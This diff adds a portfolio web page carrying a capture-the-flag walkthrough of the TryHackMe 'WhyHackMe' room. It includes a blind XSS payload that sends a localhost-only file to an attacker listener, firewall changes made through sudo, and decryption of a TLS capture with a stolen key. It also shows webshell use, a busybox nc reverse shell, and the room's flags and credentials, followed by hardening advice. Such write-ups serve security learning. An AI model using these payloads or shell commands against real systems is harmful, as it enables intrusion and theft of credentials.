@@ -1,0 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WhyHackMe // writeup</title>
+    <meta name="description" content="Reconnaissance, web exploitation and post-exploitation enumeration on WhyHackMe, explained clearly rather than copy-pasted.">
+    <meta name="theme-color" content="#0a0506">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="../style.css">
+    <script>
+        (function () {
+            try {
+                if (localStorage.getItem('theme') === 'light') {
+                    document.documentElement.setAttribute('data-theme', 'light');
+                }
+            } catch (e) { }
+        })();
+    </script>
+</head>
+
+<body class="writeup-page">
+    <div class="scanlines" aria-hidden="true"></div>
+    <div class="scroll-progress" id="scrollProgress"></div>
+
+    <header class="writeup-topbar">
+        <a class="prompt-link" href="../writeups.html">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~/writeups</span><span class="prompt-sym">$</span>
+            <span class="prompt-cmd">cd .. [Archive Portal]</span>
+        </a>
+        <div class="topbar-actions">
+            <a class="card-link small github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener"><i class="fab fa-github"></i> GitHub Repo</a>
+            <a class="card-link small" href="../index.html" style="margin-right: 0.5rem;"><i class="fas fa-terminal"></i> Main Dossier</a>
+            <span class="kbd-hint"><kbd>T</kbd> theme</span>
+            <button class="theme-toggle" id="themeToggle" type="button">
+                <i class="fas fa-moon"></i><span>Theme</span>
+            </button>
+        </div>
+    </header>
+
+    <main class="writeup-shell">
+        <article class="writeup-article">
+            <div class="writeup-head">
+                <p class="writeup-kicker">// verified laboratory walkthrough</p>
+                <h1>WhyHackMe</h1>
+                <div class="writeup-meta">
+                    <span class="badge">TryHackMe</span>
+      <span class="badge ghost">Web</span>
+      <span class="badge diff-medium">Medium</span>
+      <span class="meta-item"><i class="fas fa-calendar"></i> 2026-08-06</span>
+      <span class="meta-item"><i class="fas fa-tags"></i> TryHackMe / Web / Medium</span>
+      <span class="meta-item"><i class="fas fa-file-code"></i> whyhackme-writeup.md</span>
+                </div>
+                <p class="writeup-summary">Reconnaissance, web exploitation and post-exploitation enumeration on WhyHackMe, explained clearly rather than copy-pasted.</p>
+                <div class="writeup-actions">
+                    <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/whyhackme-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                    <a class="card-link" href="whyhackme-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                    <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Writeups Portal</a>
+                    <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                </div>
+            </div>
+            <div class="writeup-body">
+                <h2>TryHackMe Room Writeup Web / Linux | Technique: FTP Anon -&gt; Blind XSS -&gt; SSH -&gt; iptables + PCAP -&gt; Webshell -&gt; Root Target: 10.49.151.83 | Flags: user.txt + root.txt</h2>
+<h1>1. Room Overview</h1>
+<h2>WhyHackMe is a full boot-to-root box that chains several classic vulnerabilities: an FTP server allowing anonymous login, a stored (blind) XSS in a blog that lets us read a localhost-only file, SSH credentials, an overly permissive sudo rule for iptables, and finally a leftover attacker webshell hiding behind TLS on a firewalled port. Goal: read user.txt and root.txt.</h2>
+<h3>Attack path at a glance: anonymous FTP -&gt; update.txt -&gt; blind XSS -&gt; /dir/pass.txt -&gt; SSH as jack -&gt; user.txt -&gt; sudo iptables -&gt; decrypt PCAP -&gt; backdoor webshell on 41312 -&gt; www-data RCE -&gt; sudo (NOPASSWD: ALL) -&gt; root.txt</h3>
+<h2>2.1 Nmap scan</h2>
+<h3>I RECON - full service scan of the target</h3>
+<p>sudo nmap -Pn -sC -sV 10.49.151.83 # key results: # 21/tcp  open  ftp        vsftpd 3.0.3   (anonymous login allowed) # 22/tcp  open  ssh        OpenSSH # 80/tcp  open  http       Apache 2.4.41 (Ubuntu)</p>
+<h1>3. Anonymous FTP - update.txt</h1>
+<h2>The FTP server allows anonymous login. Let&#39;s list and grab the only file there:</h2>
+<h3>I RECON - anonymous FTP listing &amp; download</h3>
+<h1>list the FTP root as anonymous curl -s --user &quot;anonymous:&quot; &quot;ftp://10.49.151.83/&quot; # -rw-r--r-- 1 0 0 318 Mar 14 2023 update.txt # download and read it curl -s --user &quot;anonymous:&quot; -o update.txt &quot;ftp://10.49.151.83/update.txt&quot; cat update.txt</h1>
+<h3>I INITIAL ACCESS - update.txt content (leak)</h3>
+<p>Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don&#39;t worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account.</p>
+<ul><li>admin</li></ul>
+<h3>The credentials live in /dir/pass.txt but it can only be reached from localhost. Trying to fetch it remotely returns 403 Forbidden. We need a way to make the server itself request it - a blind XSS against the admin who monitors the blog.</h3>
+<h1>4. Web Application Enumeration</h1>
+<h3>I ENUM - directory brute force with gobuster</h3>
+<p>gobuster dir -u http://10.49.151.83 \ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \ -x php,txt # interesting results: # /blog.php         (blog with a comment section) # /login.php # /register.php     (open registration) # /dir              (403 - localhost only)</p>
+<h2>The homepage links to /blog.php. The comment section is only usable after login, and a comment from &#39;admin&#39; says he is monitoring the comments - that means a bot (admin) visits the blog and will execute JavaScript in our comments/usernames.</h2>
+<h3>I ENUM - inspect the app pages</h3>
+<p>curl -s http://10.49.151.83/ curl -s http://10.49.151.83/blog.php curl -s http://10.49.151.83/register.php curl -s -o /dev/null -w &quot;%{http_code}\n&quot; http://10.49.151.83/dir/pass.txt # 403 - confirmed localhost only</p>
+<h1>5. Blind XSS - Stealing /dir/pass.txt</h1>
+<h2>5.1 Why the username? - filter bypass Comment content gets sanitised (&lt;script&gt; tags are stripped), but the USERNAME field is not. When the admin bot loads the blog, every comment is rendered as Name: &lt;username&gt;, so a script inside the username executes in the bot&#39;s browser. We register a user whose username is the payload. 5.2 Payload The payload fetches the localhost-only file and sends its contents (base64) to our listener via an Image request:</h2>
+<h3>I EXPLOIT - XSS payload (used as the username)</h3>
+<p>&lt;script&gt;fetch(&quot;http://127.0.0.1/dir/pass.txt&quot;) .then(r=&gt;r.text()) .then(t=&gt;new Image().src=&quot;http://&lt;ATTACKER_IP&gt;:8000/?p=&quot;+btoa(t))&lt;/script&gt;</p>
+<h2>5.3 Fire it</h2>
+<h3>I EXPLOIT - start listener, register, login, comment</h3>
+<h1>terminal 1: HTTP listener to catch the exfiltrated data python3 -m http.server 8000 # terminal 2: build the payload, then register a user # whose USERNAME is the XSS payload (name field is not sanitised) PAYLOAD=&#39;&lt;script&gt;fetch(&quot;http://127.0.0.1/dir/pass.txt&quot;).then(r=&gt;r.text())&#39; PAYLOAD=$PAYLOAD&#39;.then(t=&gt;new Image().src=&quot;http://192.168.155.203:8000/?p=&quot;+btoa(t))&lt;/script&gt;&#39; curl -s -o /dev/null -w &quot;register: %{http_code}\n&quot; \ --data-urlencode &quot;username=$PAYLOAD&quot; \ --data-urlencode &#39;password=pass123&#39; \ -d &#39;Register=&#39; http://10.49.151.83/register.php # login with the same XSS username curl -s -c xsscookies.txt -o /dev/null -w &quot;login: %{http_code}\n&quot; \ --data-urlencode &quot;username=$PAYLOAD&quot; \ --data-urlencode &#39;password=pass123&#39; \ -d &#39;Login=&#39; http://10.49.151.83/login.php # post a comment so the admin bot sees our username curl -s -b xsscookies.txt -o /dev/null -w &quot;comment: %{http_code}\n&quot; \ --data-urlencode &#39;comment=please check this post&#39; \ -d &#39;Submit=&#39; http://10.49.151.83/blog.php # a few seconds later the bot&#39;s browser hits our listener: # 10.49.151.83 - &quot;GET /?p=amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo= HTTP/1.1&quot; 200</h1>
+<h2>5.4 Decode the credentials</h2>
+<h3>I EXPLOIT - decode base64 -&gt; SSH credentials</h3>
+<p>echo &quot;amFjazpXaHlJc015UGFzc3dvcmRTb1N0cm9uZ0lESwo=&quot; | base64 -d # jack:WhyIsMyPasswordSoStrongIDK</p>
+<h3>The blind XSS turned the &#39;localhost-only&#39; restriction into a one-way door: the bot fetched /dir/pass.txt for us and handed us valid SSH credentials.</h3>
+<h1>6. SSH - user.txt</h1>
+<h3>I EXPLOIT - SSH login as jack</h3>
+<p>ssh jack@10.49.151.83 # password: WhyIsMyPasswordSoStrongIDK cat /home/jack/user.txt</p>
+<h1>user.txt: 1ca4eb201787acbfcf9e70fca87b866a 7. Privilege Escalation - jack to root</h1>
+<h2>7.1 What can jack run with sudo?</h2>
+<h3>I PRIVESC - sudo rights + suspicious files</h3>
+<p>sudo -l # User jack may run the following commands on ubuntu: #     (ALL : ALL) /usr/sbin/iptables ls -la /opt # /opt/capture.pcap   - network capture of the incident # /opt/urgent.txt cat /opt/urgent.txt</p>
+<h3>I PRIVESC - urgent.txt content</h3>
+<p>Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.</p>
+<h3>So: an attacker planted a backdoor in /usr/lib/cgi-bin/, the admin blocked it with an iptables rule, and the pcap shows the attacker&#39;s own traffic. We can unblock the port (sudo iptables) and replay the attacker&#39;s access.</h3>
+<h2>7.2 Download the pcap and the TLS key</h2>
+<h3>I PRIVESC - grab capture.pcap + apache TLS private key</h3>
+<h1>via sftp/scp (password: WhyIsMyPasswordSoStrongIDK) scp jack@10.49.151.83:/opt/capture.pcap . scp jack@10.49.151.83:/etc/apache2/certs/apache.key . # the key is the Apache RSA private key used by the backdoor server</h1>
+<h2>7.3 Open the blocked port</h2>
+<h3>I PRIVESC - allow port 41312 through iptables</h3>
+<h1>see the rules with line numbers sudo iptables -L INPUT --line-numbers # 1 DROP tcp -- anywhere anywhere tcp dpt:41312 &lt;- blocked backdoor # replace the DROP rule with ACCEPT sudo iptables -R INPUT 1 -p tcp --dport 41312 -j ACCEPT # verify it is now open sudo iptables -L INPUT --line-numbers # 1 ACCEPT tcp -- anywhere anywhere tcp dpt:41312</h1>
+<h2>7.4 Decrypt the pcap (TLS) The capture is TLS traffic to port 41312. By giving tshark the server&#39;s RSA private key we can decrypt it and see the attacker&#39;s requests (this is exactly what &#39;add the RSA key in Wireshark &gt; Preferences &gt; Protocols &gt; TLS&#39; does):</h2>
+<h3>I PRIVESC - decrypt TLS with the RSA key and list HTTP requests</h3>
+<p>tshark -r capture.pcap \ -o &quot;tls.keys_list:10.13.64.69,41312,http,apache.key&quot; \ -Y &quot;http&quot; -T fields -e http.request.uri # decrypted requests: # /cgi-bin/5UP3r53Cr37.py # /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&amp;iv=VZukhsCo8TlTXORN&amp;cmd=id # /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&amp;iv=VZukhsCo8TlTXORN&amp;cmd=ls%20-al</p>
+<h2>7.5 Use the attacker&#39;s webshell</h2>
+<h3>I EXPLOIT - verify RCE on the backdoor webshell</h3>
+<h1>the webshell on the now-open port (self-signed cert -&gt; -k) curl -sk &quot;https://10.49.151.83:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&amp;iv=VZukhsCo8TlTXORN&amp;cmd=id&quot; # uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d) # list the backdoor location curl -sk &quot;https://10.49.151.83:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&amp;iv=VZukhsCo8TlTXORN&amp;cmd=ls%20-al%20/us # -rwxr-xr-x 1 root root 485 5UP3r53Cr37.py</h1>
+<h2>7.6 Reverse shell as www-data</h2>
+<h3>I EXPLOIT - reverse shell via busybox nc</h3>
+<h1>terminal 1: listener nc -lvnp 4444 # terminal 2: fire the reverse shell through the webshell (URL-encoded) curl -sk &quot;https://10.49.151.83:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&amp;iv=VZukhsCo8TlTXORN&amp;cmd=busybox%20nc%2 # terminal 1: connection received # Connection received on 10.49.151.83 33214 # uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)</h1>
+<h2>7.7 Escalate to root</h2>
+<h3>I ROOT - www-data has NOPASSWD ALL</h3>
+<p>id # uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d) sudo -n -l # User www-data may run the following commands on ubuntu: #     (ALL : ALL) NOPASSWD: ALL      &lt;- passwordless root! sudo bash # root@ubuntu:~# cat /root/root.txt</p>
+<h1>root.txt: 4dbe2259ae53846441cc2479b5475c72 8. How to Prevent These Vulnerabilities</h1>
+<h2>8.1 Anonymous FTP Disable anonymous login entirely (anonymous_enable=NO in /etc/vsftpd.conf) unless there is a business requirement, in which case: use a locked-down chroot, read-only access to a dedicated directory, and never place secrets or system hints (update.txt) there. Monitor FTP logs for anonymous sessions. 8.2 Stored / blind XSS This whole initial access happened because a username was rendered as raw HTML. Fixes: (1) always context-appropriate output encoding (e.g. htmlspecialchars() for HTML context) on EVERY user-controlled field, including usernames; (2) validate/sanitise input server-side (allow only safe characters in usernames); (3) deploy a Content-Security-Policy that blocks inline scripts and limits connect-src; (4) admin/bot browsers must run with an isolated profile, no session cookies, and must never render untrusted content. 8.3 &#39;Localhost-only&#39; secret files Relying on 127.0.0.1 ACLs is not security - any SSRF or XSS beats it. Never store plaintext credentials in web-accessible files. If a secret must exist server-side, keep it in a config file outside the web root, protected by filesystem permissions, and never referenced from a URL. Rotate credentials immediately when an account is compromised (update.txt was posted publicly after &#39;mike&#39; was compromised - by then it was too late to be useful as a secret). 8.4 Overly permissive sudo jack being able to run /usr/sbin/iptables as root let an unprivileged user change the firewall, and www-data had NOPASSWD: ALL (instant root). Rules of thumb: never grant NOPASSWD ALL to a web worker; run the web server as an unprivileged dedicated user with no sudo at all; manage the firewall only through root-owned automation (systemd unit, ansible, firewall-cmd/ufw policy), never through interactive sudo for regular users; audit /etc/sudoers and sudo -l outputs periodically. 8.5 TLS private key exposure The Apache RSA private key was world/group-readable and allowed full decryption of captured TLS traffic. Private keys must be 0600 root-only, ideally in an HSM or at least not on the same host as anyone with shell access; use separate keys per service; monitor key file integrity; prefer forward-secret cipher suites (ECDHE) so that even a stolen key cannot decrypt past sessions. 8.6 Backdoor webshell persistence The attacker left 5UP3r53Cr37.py in /usr/lib/cgi-bin/. Prevent and detect: (1) never allow CGI/PHP execution in writable directories; (2) file integrity monitoring (AIDE/auditd/Wazuh) on /usr/lib/cgi-bin and web roots; (3) review Apache access logs for requests to suspicious paths and unexpected query strings (key/iv/cmd); (4) restrict outbound egress so even an RCE cannot dial back to a listener; (5) keep the web server fully patched and sanitise the host after any incident (the box was never properly cleaned). 8.7 Defence in depth summary Each layer was survivable on its own, but together they created the kill chain: XSS -&gt; credential theft -&gt; SSH -&gt; iptables -&gt; decrypted PCAP -&gt; webshell -&gt; passwordless sudo. Hardening any single layer (output encoding, no anonymous FTP, no sudo for web users, root-only keys, FIM on cgi-bin) would have broken the chain.</h2>
+<h1>9. Attack Timeline / Cheat Sheet</h1>
+<h3>I CHEAT SHEET - full chain with the key commands</h3>
+<pre class="code-block" data-lang="bash"><code>[1] RECON      sudo nmap -Pn -sC -sV 10.49.151.83          -&gt; 21/22/80 open
+[2] FTP ANON   curl -s --user &quot;anonymous:&quot; ftp://10.49.151.83/  -&gt; update.txt
+[3] LEAK       update.txt: creds at 127.0.0.1/dir/pass.txt (localhost only)
+[4] WEB        gobuster -&gt; /blog.php /login.php /register.php /dir
+[5] XSS        username=&lt;script&gt;fetch(...).then(...)&lt;/script&gt; (blind)
+[6] EXFIL      python3 -m http.server 8000 -&gt; base64 of jack:WhyIsMyPasswordSoStrongIDK
+[7] SSH        ssh jack@10.49.151.83 -&gt; cat /home/jack/user.txt
+[8] USER FLAG  1ca4eb201787acbfcf9e70fca87b866a
+[9] SUDO       sudo -l -&gt; jack: /usr/sbin/iptables only
+[10] PCAP      /opt/capture.pcap + /etc/apache2/certs/apache.key
+[11] FIREWALL  sudo iptables -R INPUT 1 -p tcp --dport 41312 -j ACCEPT
+[12] DECRYPT   tshark -o tls.keys_list:10.13.64.69,41312,http,apache.key
+[13] WEBSHELL  /cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&amp;iv=VZukhsCo8TlTXORN&amp;cmd=id
+[14] SHELL     busybox nc 192.168.155.203 4444 -e /bin/bash (www-data)
+[15] ROOT      sudo -l -&gt; (ALL) NOPASSWD: ALL -&gt; sudo bash
+[16] ROOT FLAG 4dbe2259ae53846441cc2479b5475c72</code></pre>
+<h2>Flags: user.txt = 1ca4eb201787acbfcf9e70fca87b866a | root.txt = 4dbe2259ae53846441cc2479b5475c72</h2>
+            </div>
+            <div class="writeup-foot">
+                <a class="card-link primary" href="../writeups.html"><i class="fas fa-scroll"></i> Full Writeups Portal</a>
+                <a class="card-link" href="../index.html#writeups"><i class="fas fa-arrow-left"></i> Main Dossier</a>
+                <a class="card-link github" href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs/blob/main/whyhackme-writeup.pdf" target="_blank" rel="noopener"><i class="fab fa-github"></i> Open on GitHub</a>
+                <a class="card-link" href="whyhackme-writeup.pdf" download><i class="fas fa-file-pdf"></i> Download Verified PDF</a>
+                <a class="card-link" href="mailto:parajulisameek@gmail.com"><i class="fas fa-envelope"></i> report a typo</a>
+            </div>
+        </article>
+    </main>
+
+    <footer class="site-footer">
+        <p class="footer-cmd">
+            <span class="prompt-user">sameekey@portfolio</span><span class="prompt-sep">:</span><span class="prompt-path">~</span><span class="prompt-sym">$</span>
+            echo "Defense is good. Offense is mandatory."
+        </p>
+        <p class="footer-muted">&copy; <span id="year"></span> Sameek Parajuli &middot; <a href="https://github.com/Samik-Parajuli/tryhackme_walkthroughs" target="_blank" rel="noopener">GitHub /tryhackme_walkthroughs</a></p>
+    </footer>
+
+    <!-- Image Lightbox Modal -->
+    <div class="lightbox-modal" id="lightboxModal" hidden>
+        <div class="lightbox-backdrop"></div>
+        <div class="lightbox-content">
+            <img src="" id="lightboxImg" alt="Enlarged view">
+            <button class="lightbox-close" id="lightboxClose" type="button">&times;</button>
+        </div>
+    </div>
+
+    <div class="scroll-to-top" id="scrollToTop" role="button" tabindex="0" aria-label="Scroll to top">
+        <i class="fas fa-arrow-up"></i>
+    </div>
+
+    <script src="../script.js"></script>
+</body>
+
+</html>
